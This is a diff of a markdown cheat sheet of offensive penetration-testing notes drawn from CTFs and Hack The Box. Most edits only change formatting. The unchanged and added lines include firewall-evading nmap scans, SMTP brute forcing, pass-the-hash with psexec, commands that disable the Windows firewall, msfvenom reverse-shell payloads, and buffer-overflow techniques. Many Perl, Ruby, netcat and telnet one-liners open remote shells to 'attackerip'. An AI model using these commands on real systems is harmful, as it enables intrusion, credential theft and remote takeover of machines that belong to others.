@@ -4,7 +4,7 @@ title: CheatSheet - Unordered Notes from CTFs & HTB
 ---
 
     "The quieter you become, The more you’re able to hear"
-    
+
 <center>
 <p style="text-align:center;"><img src="/images/kali.png" alt="Logo"></p>
 </center>
@@ -23,38 +23,54 @@ title: CheatSheet - Unordered Notes from CTFs & HTB
 
 #### Port found, found all the ports, but UDP port scanning will be very slow
 
-    $ nmap -sS -T4 -Pn –top-ports 3674 -oG 3674 -iL LiveHosts.txt
-    $ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
-    $ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt
+    nmap -sS -T4 -Pn –top-ports 3674 -oG 3674 -iL LiveHosts.txt
+    nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
+    nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt
 
 #### Displays the TCP / UDP port
-    $ grep “open” FullTCP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘{print “T:”$0}’
-    $ grep “open” FullUDP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘{print “U:”$0}’
+
+    grep “open” FullTCP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘{print “T:”$0}’
+    grep “open” FullUDP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘{print “U:”$0}’
 
 #### Detect the service version
 
-    $ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
-    $ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
-    $ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
+    nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
+    nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
+    nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
 
 Nmap to avoid the firewall
 
 #### Segmentation
-    $ nmap -f
+
+    nmap -f
+
 #### Modify the default MTU size, but it must be a multiple of 8 (8, 16, 24, 32, etc.)
-    $ nmap –mtu 24
+
+    nmap –mtu 24
+
 #### Generate random numbers of spoofing
-    $ nmap -D RND:10 [target]
+
+    nmap -D RND:10 [target]
+
 #### Manually specify the IP to be spoofed
-    $ nmap -D decoy1,decoy2,decoy3 etc.
+
+    nmap -D decoy1,decoy2,decoy3 etc.
+
 #### Botnet scanning, first need to find the botnet IP
-    $ nmap -sI [Zombie IP] [Target IP]
+
+    nmap -sI [Zombie IP] [Target IP]
+
 #### Designated source terminal
-    $ nmap –source-port 80 IP
+
+    nmap –source-port 80 IP
+
 #### Add a random number of data after each scan
-    $ nmap –data-length 25 IP
+
+    nmap –data-length 25 IP
+
 #### MAC address spoofing, you can generate different host MAC address
-    $ nmap –spoof-mac Dell/Apple/3Com IP
+
+    nmap –spoof-mac Dell/Apple/3Com IP
 
 #### Nmap for Web vulnerability scanning
 
@@ -68,11 +84,13 @@ Nmap to avoid the firewall
     nmap -PN -sS -sV –script=all –script-args vulscancorrelation=1 target
 
 #### Web path scanner
+
     dirsearch 
     DirBuster
     Patator- password guessing attacks
-    
+
 #### Brute force with Patatpr
+
     git clone https://github.com/lanjelot/patator.git /usr/share/patator
     $ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
     $ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
@@ -80,7 +98,8 @@ Nmap to avoid the firewall
     $ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=’incorrect            password or account name’
 
 #### Use Fierce to brute DNS
-#### Note: Fierce checks whether the DNS server allows zone transfers. If allowed, a zone transfer is made and the user is notified. If not, the host name can be enumerated by querying the DNS server.
+
+#### Note: Fierce checks whether the DNS server allows zone transfers. If allowed, a zone transfer is made and the user is notified. If not, the host name can be enumerated by querying the DNS server
 
     # http://ha.ckers.org/fierce/
     $ ./fierce.pl -dns example.com
@@ -101,7 +120,8 @@ Nmap to avoid the firewall
     ./httprint -h http://IP -s signatures.txt
 
 #### Scan with Skipfish
-#### Note: Skipfish is a Web application security detection tool, Skipfish will use recursive crawler and dictionary-based probe to generate an interactive site map, the resulting map will be generated after the security check output.
+
+#### Note: Skipfish is a Web application security detection tool, Skipfish will use recursive crawler and dictionary-based probe to generate an interactive site map, the resulting map will be generated after the security check output
 
     skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
 
@@ -111,7 +131,8 @@ Nmap to avoid the firewall
     for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 
 #### Unicornscan
-#### NOTE: Unicornscan is a tool for information gathering and security audits.
+
+#### NOTE: Unicornscan is a tool for information gathering and security audits
 
     us -H -msf -Iv 192.168.56.101 -p 1-65535
     us -H -mU -Iv 192.168.56.101 -p 1-65535
@@ -154,7 +175,9 @@ Nmap to avoid the firewall
 #### Meterpreter port forwarding
 
     https://www.offensive-security.com/metasploit-unleashed/portfwd/
+
 #### Forward the remote port to the destination address
+
     meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
     kali > rdesktop 127.0.0.1:3389
 
@@ -165,6 +188,7 @@ Nmap to avoid the firewall
     netsh firewall set service remotedesktop enable
 
 #### Close Windows Firewall
+
     netsh firewall set opmode disable
 
 Meterpreter VNC/RDP
@@ -200,10 +224,11 @@ Gets a hash value
     msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
     msf exploit(psexec) > exploit
     meterpreter > shell
-    
-#### Use Hashcat to crack passwords    
+
+#### Use Hashcat to crack passwords
+
     hashcat -m 400 -a 0 hash /root/rockyou.txt
-    
+
 #### Use the NC to fetch Banner information
 
     nc 192.168.0.10 80
@@ -213,7 +238,6 @@ Gets a hash value
     Referrer: www.example.com
     <enter>
     <enter>
-
 
 #### Use NC to bounce the shell on Windows
 
@@ -229,21 +253,27 @@ nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
 Look for the SUID/SGID root file
 
 #### Locate the SUID root file
+
 find / -user root -perm -4000 -print
 
-#### Locate the SGID root file:
+#### Locate the SGID root file
+
 find / -group root -perm -2000 -print
 
-#### Locate the SUID and SGID files:
+#### Locate the SUID and SGID files
+
 find / -perm -4000 -o -perm -2000 -print
 
-#### Find files that do not belong to any user:
+#### Find files that do not belong to any user
+
 find / -nouser -print
 
-#### Locate a file that does not belong to any user group:
+#### Locate a file that does not belong to any user group
+
 find / -nogroup -print
 
-#### Find soft links and point to:
+#### Find soft links and point to
+
 find / -type l -ls
 
 #### Python shell
@@ -254,8 +284,7 @@ find / -type l -ls
 
     python2 -m SimpleHTTPServer
     python3 -m http.server
-    ruby -rwebrick -e “WEBrick::HTTPServer.new(:Port => 8888, 😀
-    ocumentRoot => Dir.pwd).start”
+    ruby -rwebrick -e “WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start”
     php -S 0.0.0.0:8888
 
 #### Gets the PID corresponding to the process
@@ -309,9 +338,8 @@ find / -type l -ls
 
 #### Use metasploit for penetration
 
- 
+#### <https://www.offensive-security.com/metasploit-unleashed/pivoting/>
 
-#### https://www.offensive-security.com/metasploit-unleashed/pivoting/
     meterpreter > ipconfig
     IP Address : 10.1.13.3
     meterpreter > run autoroute -s 10.1.13.0/24
@@ -342,26 +370,33 @@ find / -type l -ls
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b “\x00” -a x86 –platform win -f c
 
 #### MSF generates the Meterpreter Shell that bounces under Linux
+
     msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 –platform linux -o shell
 
 #### MSF build bounce Shell (C Shellcode)
+
     msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b “\x00\x0a\x0d” -a x86 –platform win -f c
 
 #### MSF generates a bounce Python Shell
+
     msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
 
 #### MSF builds rebound ASP Shell
+
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 –platform win -o shell.asp
 
 #### MSF generates bounce shells
+
     msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh
 
 #### MSF build bounces PHP Shell
+
     msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
     add <?php at the beginning
     perl -i~ -0777pe’s/^/<?php \n/’ shell.php
 
 #### MSF generates bounce Win Shell
+
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 –platform win -o shell.exe
 
 #### Linux commonly used security commands
@@ -394,17 +429,18 @@ find / -type l -ls
     find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’
     chattr -i file
 
-#### Windows Buffer Overflow exploits 
+#### Windows Buffer Overflow exploits
 
     msfvenom -p windows/shell_bind_tcp -a x86 –platform win -b “\x00” -f c
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 –platform win -e x86/shikata_ga_nai -b “\x00” -f c
 
-#### COMMONLY USED BAD CHARACTERS:
+#### COMMONLY USED BAD CHARACTERS
 
     \x00\x0a\x0d\x20 For http request
     \x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c Ending with (0\n\r_)
 
-#### Regular command:
+#### Regular command
+
     pattern create
     pattern offset (EIP Address)
     pattern offset (ESP Address)
@@ -433,7 +469,7 @@ Note: SEH (“Structured Exception Handling”), or structured exception handlin
     !mona suggest
     !mona nosafeseh
     nseh=”\xeb\x06\x90\x90″ (next seh chain)
-    iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)
+    iseh= !pvefindaddr p1 -n -o -i (POP POP RETURN or POPr32,POPr32,RETN)
 
 #### ROP (DEP)
 
@@ -450,8 +486,10 @@ DEP (“Data Execution Prevention”) is a set of hardware and software technolo
     !mona rop -m *.dll -cpb “\x00\x09\x0a” (auto suggest)
 
 #### ASLR – Address space format randomization
+
     # https://en.wikipedia.org/wiki/Address_space_layout_randomization
     !mona noaslr 
+
 #### EGG Hunter technology
 
 Egg hunting This technique can be categorized as a “graded shellcode”, which basically supports you to find your actual (larger) shellcode (our “egg”) with a small, specially crafted shellcode, In search of our final shellcode. In other words, a short code executes first, then goes to the real shellcode and executes it. – Making reference to see Ice Forum , more details can be found in the code I add comments link.
@@ -476,9 +514,11 @@ Egg hunting This technique can be categorized as a “graded shellcode”, which
     c
 
 #### Data
+
     checking ‘REGISTERS’ and ‘MEMORY’
 
 #### Display the register values: (Decimal,Binary,Hex)
+
     print /d –> Decimal
     print /t –> Binary
     print /x –> Hex
@@ -492,6 +532,7 @@ Egg hunting This technique can be categorized as a “graded shellcode”, which
     (gdb)
 
 #### Display the value of a specific memory address
+
     command : x/nyz (Examine)
     n –> Number of fields to display ==>
     y –> Format for output ==> c (character) , d (decimal) , x (Hexadecimal)
@@ -522,6 +563,7 @@ Egg hunting This technique can be categorized as a “graded shellcode”, which
     perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:443″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’
 
 #### Win platform
+
     perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’
     perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
 
@@ -530,6 +572,7 @@ Egg hunting This technique can be categorized as a “graded shellcode”, which
     ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“attackerip”,”443″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’
 
 #### Win platform
+
     ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”443″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’
     ruby -rsocket -e ‘f=TCPSocket.open(“attackerip”,”443″).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’
 
@@ -553,16 +596,19 @@ Egg hunting This technique can be categorized as a “graded shellcode”, which
     nc -e /bin/sh 192.168.37.10 443
 
 #### If the -e parameter is disabled, you can try the following command
+
     # mknod backpipe p && nc attackerip 443 0<backpipe | /bin/bash 1>backpipe
     /bin/sh | nc attackerip 443
     rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/
 
 #### If you installed the wrong version of netcat, try the following command
+
     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f
 
     TELNET rebound Shell
 
 #### If netcat is not available
+
     mknod backpipe p && telnet attackerip 443 0<backpipe | /bin/bash 1>backpipe
 
     XTERM rebound Shell
@@ -573,11 +619,15 @@ Egg hunting This technique can be categorized as a “graded shellcode”, which
     Xnest :1
 
 #### Remember to authorize the connection from the target IP
+
     xterm -display 127.0.0.1:1
+
 #### Grant access
+
     xhost +targetip
 
 #### Connect back to our X server on the target machine
+
     xterm -display attackerip:1
     /usr/openwin/bin/xterm -display attackerip:1
     or
@@ -625,7 +675,7 @@ Egg hunting This technique can be categorized as a “graded shellcode”, which
 #### Metagoofil – Metadata collection tool
 
     Note: Metagoofil is a tool for collecting information using Google.
-    $ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html
+    $ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o exemplifies -f results.html
 
 #### Use a DNS tunnel to bypass the firewall
 
